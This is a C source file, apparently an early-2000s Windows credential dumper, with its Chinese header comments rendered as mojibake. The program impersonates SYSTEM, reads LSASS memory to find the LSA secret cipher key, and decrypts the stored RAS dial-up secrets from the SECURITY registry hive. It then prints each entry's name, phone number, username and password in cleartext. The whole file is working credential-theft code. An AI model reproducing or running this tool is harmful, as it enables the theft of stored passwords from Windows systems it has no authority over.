/*
��ʾ��ԭNTƽ̨������������

ԭ����ֱ�Ӵ�ע����ж�ȡ���ܺ�����ݣ�����֮��

��������windows 2000/xp/2003ƽ̨��������Ȩ�޶�ȡע��� "HKLM\SECURITY"��

eyas at xfocus.org
http://www.xfocus.net
2004-10-01
*/
#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>
#include "wsu.cpp"
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "psapi.lib")


#define WINVER 0x500
#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <stdio.h>

#include <ras.h>
#include <raserror.h>
#include <Ntsecapi.h>
#include <Userenv.h>
#include <Sddl.h>
#include <lm.h>
#pragma comment(lib,"Rasapi32.lib")
#pragma comment(lib,"advapi32.lib")
#pragma comment(lib,"UserEnv.lib")
#pragma comment(lib,"netapi32.lib")
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

LSA_HANDLE                lsa_handle;
char            private_data[0x500];
int                        data_len;
char szTempName[MAX_PATH];

void ViewDialPass();

//��Ϯtombkeeper�Ĵ���:)
#define FCHK(a)     if (!(a)) {printf(#a " failed %d\n", GetLastError()); return 0;}

typedef struct _LSA_BLOB {
    DWORD cbData;
    DWORD cbMaxData;
    BYTE* pbData;
} LSA_BLOB;


typedef int (WINAPI *PSystemFunction005)(
    LSA_BLOB* pDataIn,
    LSA_BLOB* pDataKey,
    LSA_BLOB* pDataOut
);

PSystemFunction005    SystemFunction005;
DWORD                dwFlag=0;



char *CopyToTempFile(char *original)
{
	#define BUFSIZE 1024*50
	HANDLE hFile;
	HANDLE hTempFile; 
	DWORD  dwBytesRead, dwBytesWritten, dwBufSize=BUFSIZE;

	char buffer[BUFSIZE]; 
	char lpPathBuffer[BUFSIZE];

	// Open the existing file. 

	hFile = CreateFile(original,  // file name 
		GENERIC_READ,                   // open for reading 
		0,                              // do not share 
		NULL,                           // default security 
		OPEN_EXISTING,                  // existing file only 
		FILE_ATTRIBUTE_NORMAL,          // normal file 
		NULL);                          // no template 
	if (hFile == INVALID_HANDLE_VALUE) 
	{ 
		printf("Could not open file.");
		return 0;
	} 
	DWORD  dwNumOfBytesRead = 0, dwNumOfBytesWrite = 0;
	DWORD nSize = GetFileSize(hFile, NULL);
	char *pbkContent = new char [nSize];
	ReadFile(hFile, pbkContent, nSize, &dwNumOfBytesRead, NULL);
	
	int ret = 0, newsize=0;
	ret = MultiByteToWideChar(CP_UTF8, 0, pbkContent, nSize, NULL, 0);
	WCHAR *pbkContentW = new WCHAR [sizeof(WCHAR)*ret];
	MultiByteToWideChar(CP_UTF8, 0, pbkContent, nSize, pbkContentW, sizeof(WCHAR)*ret);

	newsize = WideCharToMultiByte(CP_ACP, 0, pbkContentW, ret, NULL, 0, NULL, NULL);

	char *pbkASCIIContent = new char [newsize];
	WideCharToMultiByte(CP_ACP, 0, pbkContentW, ret, pbkASCIIContent, newsize, NULL, NULL);

	// Get the temp path

	GetTempPath(dwBufSize,   // length of the buffer
		 lpPathBuffer);      // buffer for path 

	// Create a temporary file. 

	GetTempFileName(lpPathBuffer, // directory for temp files 
		"tmppbk",                    // temp file name prefix 
		0,                        // create unique name 
		szTempName);              // buffer for name 

	hTempFile = CreateFile((LPTSTR) szTempName,  // file name 
		GENERIC_READ | GENERIC_WRITE, // open for read/write 
		0,                            // do not share 
		NULL,                         // default security 
		CREATE_ALWAYS,                // overwrite existing file
		FILE_ATTRIBUTE_NORMAL,        // normal file 
		NULL);                        // no template 

	if (hTempFile == INVALID_HANDLE_VALUE) 
	{
		printf("Could not create temporary file."); 
		return 0;
	}
	WriteFile(hTempFile, pbkASCIIContent, ret, &dwNumOfBytesWrite, NULL);

	CloseHandle(hTempFile);
	CloseHandle(hFile);
	delete [] pbkContent;
	delete [] pbkContentW;
	delete [] pbkASCIIContent;

	return szTempName;
}


bool get_real_pass(DWORD dwDialParamsUID, char *user, char *pass)
{
    int    i, j;
    char *p, szDialParamsUID[52];

    sprintf(szDialParamsUID, "%d", dwDialParamsUID);

	char pd[0x500];
	memcpy(pd, private_data, data_len);
    p = pd;

    for(i=0;i<data_len;i++)
    {
        if(strcmp(&p[i], szDialParamsUID) == 0 )
        {
            lstrcpy(user, &p[i+10+lstrlen(szDialParamsUID)]);
			lstrcpy(pass, &p[i+10+lstrlen(szDialParamsUID)+lstrlen(user)+1]);
            return 1;
        }
    }

    return 0;
}


//����lsadump2�е�dumplsa.c
int myisprint (int ch)
{
    return ((ch >= ' ') && (ch <= '~'));
}
//����lsadump2�е�dumplsa.c
void
dump_bytes (unsigned char *p, size_t sz)
{
    char szDumpBuff[256];

    if(sz==0)
        return;

    while (sz > 16) {
        _snprintf (szDumpBuff, sizeof (szDumpBuff),
                   " %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X  %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\n",
                   p[0], p[1], p[2], p[3], p[4], p[5], p[6], p[7],
                   p[8], p[9], p[10], p[11], p[12], p[13], p[14], p[15],
                   myisprint(p[0]) ? p[0] : '.',
                   myisprint(p[1]) ? p[1] : '.',
                   myisprint(p[2]) ? p[2] : '.',
                   myisprint(p[3]) ? p[3] : '.',
                   myisprint(p[4]) ? p[4] : '.',
                   myisprint(p[5]) ? p[5] : '.',
                   myisprint(p[6]) ? p[6] : '.',
                   myisprint(p[7]) ? p[7] : '.',
                   myisprint(p[8]) ? p[8] : '.',
                   myisprint(p[9]) ? p[9] : '.',
                   myisprint(p[10]) ? p[10] : '.',
                   myisprint(p[11]) ? p[11] : '.',
                   myisprint(p[12]) ? p[12] : '.',
                   myisprint(p[13]) ? p[13] : '.',
                   myisprint(p[14]) ? p[14] : '.',
                   myisprint(p[15]) ? p[15] : '.');
        printf ("%s", szDumpBuff);
        p+=16;
        sz -= 16;
    }

    if (sz) {
        char buf[17];
        int i = 0;
        int j = 16 - sz;
        memset (buf, 0, sizeof (buf));
        szDumpBuff[0] = 0;
        while (sz--) {
            _snprintf (szDumpBuff+strlen (szDumpBuff),
                       sizeof (szDumpBuff) - strlen (szDumpBuff),
                       " %02X", *p);
            if (myisprint (*p))
                buf[i++] = *p;
            else
                buf[i++] = '.';
            p++;
        }
        _snprintf (szDumpBuff+strlen (szDumpBuff),
                   sizeof (szDumpBuff)-strlen (szDumpBuff),
                   "%*s%s\n", j*3 + 2, "", buf);
        printf ("%s", szDumpBuff);
    }
}

DWORD search_LsapDbSecretCipherKey(BYTE **ppKey, DWORD pid)
{
    HANDLE    hLsass, hLsasrv;
    DWORD    dwRead, i, dwAddr;
    BYTE    *pImage = NULL;
    MODULEINFO    mod;
    BOOL    bRet = FALSE;
    DWORD    dwCount = 0, dwMaxCount=100;

    FCHK ( (hLsasrv = LoadLibrary("lsasrv.dll")) );

    FCHK ( GetModuleInformation(GetCurrentProcess(), (HMODULE)hLsasrv, 
        &mod, sizeof(mod)) );

    FCHK ( hLsass = OpenProcess(PROCESS_VM_READ, FALSE, pid) );

    pImage = (BYTE*)malloc(mod.SizeOfImage);

    ReadProcessMemory(hLsass, (BYTE*)hLsasrv, 
                            pImage, mod.SizeOfImage-0x10, &dwRead);

    *ppKey = (BYTE*)malloc(dwMaxCount*0x10);
    
    __try
    {
        for(i=0;i<mod.SizeOfImage;i++)
        {
            if( memcmp(&pImage[i], "\x10\x00\x00\x00\x10\x00\x00\x00", 8) == 0)
            {
                dwAddr = *(DWORD *)(&pImage[i+8]);
                if( ReadProcessMemory(hLsass, (LPCVOID)dwAddr, 
                            &(*ppKey[dwCount*0x10]), 0x10, &dwRead) )
                {
                        dwCount++;
                }
            }
        }//end of for
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        return dwCount;
    }

    return dwCount;
}

int GetDialPass()
{
    int ret,i,j;
    HMODULE hAdvApi32;
    HKEY hKeySecrets;
    HKEY hKey;
    DWORD dwType;
    char Data[0x500] = {0};
    BYTE    *pKey;
    DWORD dwSize;
    LSA_BLOB LSADataIn;
    LSA_BLOB LSADataOut;
    LSA_BLOB LSADataKey;
    char szSecret[500];
    char szSubKey[0x500];
    DWORD dwErr, dwCount=0;


    FCHK ((hAdvApi32 = LoadLibrary("advapi32.dll")));
    FCHK ((SystemFunction005 = (PSystemFunction005)
           GetProcAddress (hAdvApi32, "SystemFunction005")) != NULL);
    
    FCHK ((RegOpenKeyEx (HKEY_LOCAL_MACHINE,
                      "SECURITY\\Policy\\Secrets",
                      0, KEY_READ, &hKeySecrets) == ERROR_SUCCESS))

    FCHK ( ( dwCount = search_LsapDbSecretCipherKey(&pKey, GetProcessId("Lsass.exe")) ) != 0 );
    //printf("Search \"LsapDbSecretCipherKey\" return: %d\n", dwCount);


    for(j=0;j<dwCount;j++)
    {
        //printf("LsapDbSecretCipherKey [%d]\n", j);
        //dump_bytes(&pKey[j*0x10], 0x10);

        LSADataKey.cbData = LSADataKey.cbMaxData = 0x10;
        LSADataKey.pbData = &pKey[j*0x10];

        //search our target
        for (i=0; TRUE; i++)
        {
            dwErr = RegEnumKeyA (hKeySecrets, i, szSecret, sizeof (szSecret));
            if (dwErr != ERROR_SUCCESS)
                //
                // No More Secrets
                //
                break;

			if(strnicmp(szSecret, "RasDial", 7) && strnicmp(szSecret, "L$_RasD", 7))
				continue;
           // printf("\n%s\n", szSecret);
            //open it
            _snprintf(szSubKey, sizeof(szSubKey), 
                "SECURITY\\Policy\\Secrets\\%s\\CurrVal", szSecret);
            if (ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                                    szSubKey,
                                    0,
                                    KEY_READ,
                                    &hKey
                                    ) != ERROR_SUCCESS )
                continue;

            dwSize = sizeof(Data);
            FCHK ((ret = RegQueryValueEx(hKey,
                                "",
                                NULL,
                                &dwType,
                                (LPBYTE)Data,
                                &dwSize) == ERROR_SUCCESS ))

            LSADataIn.pbData = (BYTE *)Data + 0xC;  //���Ĵӵ�0xCλ��ʼ
            LSADataIn.cbData = dwSize-0xC;
            LSADataIn.cbMaxData = LSADataIn.cbData;

            //dump_bytes(LSADataIn.pbData, LSADataIn.cbData);

            LSADataOut.cbData = 0;
            LSADataOut.cbMaxData = 0;
            LSADataOut.pbData = NULL;

            SystemFunction005(&LSADataIn, &LSADataKey, &LSADataOut);
            if (LSADataOut.cbData == 0)
            {
                printf("null\n");
                continue;
            }

            FCHK ((LSADataOut.pbData = (BYTE*)malloc(LSADataOut.cbData) ) != NULL);
            LSADataOut.cbMaxData = LSADataOut.cbData;
            SystemFunction005(&LSADataIn, &LSADataKey, &LSADataOut);

            //dump_bytes(LSADataOut.pbData, LSADataOut.cbData);

			data_len = WideCharToMultiByte(0, 0, (WCHAR*)LSADataOut.pbData,
				LSADataOut.cbData, 
				private_data, sizeof(private_data), 0, 0);

			ViewDialPass();

            free(LSADataOut.pbData);
        }//end of for
        //printf("Press any key to use next \"LsapDbSecretCipherKey\", or Ctrl+C to exit.\n");
        //getchar();
    }

    if(pKey)
        free(pKey);
    return 0;
}

void ViewDialPass()
{

    LPRASENTRYNAME lpRasEntryName;
    RASDIALPARAMS RasDialParams;
    DWORD            cb, nRet, i, cEntries;
    BOOL            b;

    DWORD            dwSize, dwDialParamsUID, dwTmp;

	char user[128], pass[128];
	char szPhonenum[128]; 
	char *TmpFile;

    lpRasEntryName = (LPRASENTRYNAME)GlobalAlloc(GPTR, sizeof(RASENTRYNAME));
    lpRasEntryName->dwSize = sizeof(RASENTRYNAME);
    cb = sizeof(RASENTRYNAME);
    if ((nRet = RasEnumEntries(NULL, NULL, lpRasEntryName, &cb, &cEntries)) 
        == ERROR_BUFFER_TOO_SMALL)
    {
		HeapFree(GetProcessHeap(), 0, lpRasEntryName);
        lpRasEntryName = (LPRASENTRYNAME)GlobalAlloc(GPTR, cb);
        lpRasEntryName->dwSize = sizeof(RASENTRYNAME);
    }

    // Calling RasEnumEntries to enumerate the phone-book entries    
    nRet = RasEnumEntries(NULL, NULL, lpRasEntryName, &cb, &cEntries);

    if (nRet != ERROR_SUCCESS)
    {
        printf("[-] RasEnumEntries failed: Error %d\n", nRet);
        return;
    }

    for(i=0;i < cEntries;i++,lpRasEntryName++)
    {

        strcpy(RasDialParams.szEntryName, lpRasEntryName->szEntryName);
        RasDialParams.dwSize = sizeof(RASDIALPARAMS);

        RasGetEntryDialParams(lpRasEntryName->szPhonebookPath, &RasDialParams, &b);

		TmpFile = CopyToTempFile(lpRasEntryName->szPhonebookPath);

        dwDialParamsUID = GetPrivateProfileInt(lpRasEntryName->szEntryName, 
            "DialParamsUID", 0, TmpFile);
        GetPrivateProfileString(lpRasEntryName->szEntryName, 
            "PhoneNumber", 0, szPhonenum, sizeof(szPhonenum), TmpFile);


		DeleteFile(TmpFile);

        if(dwDialParamsUID == 0)
        {
            printf("[-] Can't get DialParamsUID from PhoneBook.\n");
            continue;
        }

		if(!get_real_pass(dwDialParamsUID, user, pass))
			continue;
        printf(
            "================================\n"
            "EntryName : %s\n"
			"Phone NO. : %s\n"
            "UserName  : %s\n"
            "PassWord  : %s\n\n",
            lpRasEntryName->szEntryName,
			szPhonenum,
            user, 
            pass);
    }
    if (NULL != lpRasEntryName)
    {
        HeapFree(GetProcessHeap(), 0, lpRasEntryName);
        lpRasEntryName = NULL;
    }

}

int main()
{
	CreateSystemProcess(0, NULL, 1);//Impersonate SYSTEM

	GetDialPass();

	RevertToSelf();//!!!
}